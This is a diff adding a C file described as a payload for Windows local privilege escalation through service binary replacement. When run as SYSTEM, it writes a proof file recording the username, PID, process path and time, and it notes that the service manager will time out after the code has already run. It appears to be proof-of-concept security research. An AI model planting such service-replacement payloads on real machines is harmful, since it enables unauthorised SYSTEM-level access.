@@ -1,0 +1,37 @@
+// payload_service.c — Payload for LPE via service binary replacement
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    // Write evidence of execution as SYSTEM
+    FILE* f = fopen("C:\\Users\\Public\\epic_lpe_proof.txt", "w");
+    if (f) {
+        // Get username (should be SYSTEM)
+        char username[256];
+        DWORD size = sizeof(username);
+        GetUserNameA(username, &size);
+
+        fprintf(f, "Username:      %s\n", username);
+        fprintf(f, "PID:           %d\n", GetCurrentProcessId());
+
+        // Get process path
+        char path[MAX_PATH];
+        GetModuleFileNameA(NULL, path, MAX_PATH);
+        fprintf(f, "Process:       %s\n", path);
+
+        // Timestamp
+        SYSTEMTIME st;
+        GetLocalTime(&st);
+        fprintf(f, "Time:          %04d-%02d-%02d %02d:%02d:%02d\n",
+                st.wYear, st.wMonth, st.wDay,
+                st.wHour, st.wMinute, st.wSecond);
+
+        fclose(f);
+    }
+
+    // The SCM expects the service to register.
+    // Since we don't, the SCM will report error 1053 (timeout).
+    // But our code already executed as SYSTEM.
+    Sleep(5000);
+    return 0;
+}
